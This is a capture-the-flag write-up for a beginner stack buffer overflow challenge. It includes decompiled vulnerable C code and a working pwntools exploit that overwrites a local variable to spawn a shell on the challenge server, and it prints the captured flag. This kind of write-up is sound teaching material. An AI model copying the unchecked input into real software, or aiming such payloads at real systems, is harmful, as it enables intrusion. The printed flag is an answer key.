# stackoverflow

## Challenge Description
`Welcome to Stack Overflow! Get answers to all your programming questions right here!`

## Solution
> TLDR: Spray 40 random characters to fill up the local array and provide 0x69637466 to modify the value of the local variable.

Ghidra's decompiled main() function:
``` c
undefined8 main(void)
{
  undefined local_38 [40];
  long local_10;
  
  local_10 = 0x42424242;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts(
      "Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What\'s your favorite color?"
      );
  __isoc99_scanf(&DAT_001009a3,local_38);
  puts("Thanks! Now onto the posts!");
  if (local_10 == 0x69637466) {
    puts("DEBUG MODE ACTIVATED.");
    system("/bin/sh");
  }
  else {
    puts("ERROR: FEATURE NOT IMPLEMENTED YET");
  }
  return 0;
}
```

To spawn a shell, I need to modify the value of "local_10" variable to 0x69637466.

Idea: Spray 40 random characters to fill up the “local_38” array and then provide 0x69637466 to modify the value of the "local_10" variable.

Working POC:
``` python
from pwn import *

addr = p64(0x69637466)
payload = ("A"*40).encode() + addr + ("A"*8).encode()
r = remote('chal.imaginaryctf.org', 42001)
r.recvuntil(b'favorite color?\n')
r.sendline(payload)
r.interactive()
```

Output of the POC:
``` bash
$ python3 stackoverflow.py
[+] Opening connection to chal.imaginaryctf.org on port 42001: Done
[*] Switching to interactive mode
Thanks! Now onto the posts!
DEBUG MODE ACTIVATED.
$ ls
flag.txt
run
$ cat flag.txt
ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}
```

Flag: `ictf{4nd_th4t_1s_why_y0u_ch3ck_1nput_l3ngth5_486b39aa}`